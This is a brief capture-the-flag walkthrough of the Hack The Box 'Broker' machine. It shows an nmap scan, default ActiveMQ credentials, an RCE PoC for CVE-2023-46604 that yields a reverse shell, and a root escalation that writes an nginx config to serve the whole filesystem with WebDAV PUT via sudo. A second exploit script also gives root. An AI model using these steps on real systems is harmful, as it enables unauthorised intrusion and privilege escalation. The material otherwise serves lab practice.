### Initial access
Nmap
```
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1883/tcp  open  mqtt
5672/tcp  open  amqp
8161/tcp  open  patrol-snmp
36657/tcp open  unknown
61613/tcp open  unknown
61614/tcp open  unknown
61616/tcp open  unknown



```
In the main site when login we see  jetty  version 9.4 activeMQ service
```
1883/tcp (MQTT): The Message Queuing Telemetry Transport listener, commonly used for lightweight IoT communication.5672/tcp (AMQP): The Advanced Message Queuing Protocol listener, used by applications to publish and consume broker traffic.8161/tcp (Web Console): The administrative dashboard and REST API for Apache ActiveMQ
```
We have defaule cred `admin:admin` on port 8161 we using this poc https://github.com/Strikoder-Premium/CVE-2023-46604-ActiveMQ-RCE-Python and we know how to pypass xml using xml encode for bad char.

And we get revshell
```bash
┌──(kali㉿kali)-[~/HTB/Broker]
└─$ penelope --oscp-safe --no-log -p 443
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.122.216 • 10.10.17.47
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => broker 10.129.230.87 Linux-x86_64 👤 activemq(1000) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
activemq@broker:/opt/apache-activemq-5.15.15/bin$ id
uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)

```

### Priv escalation

Run linpeas
```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d (T1548.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
Matching Defaults entries for activemq on broker:                                                                                                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx


```
GFTO bin
```bash
cat >/tmp/temp-file <<EOF
user root;
http {
  server {
    listen 9999;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

sudo nginx -c /tmp/temp-file

access website on port 9999
```
Use it to read flag
Copy fail work too
```bash
activemq@broker:/tmp$ python3 exp.py 
# id
uid=0(root) gid=1000(activemq) groups=1000(activemq)

```
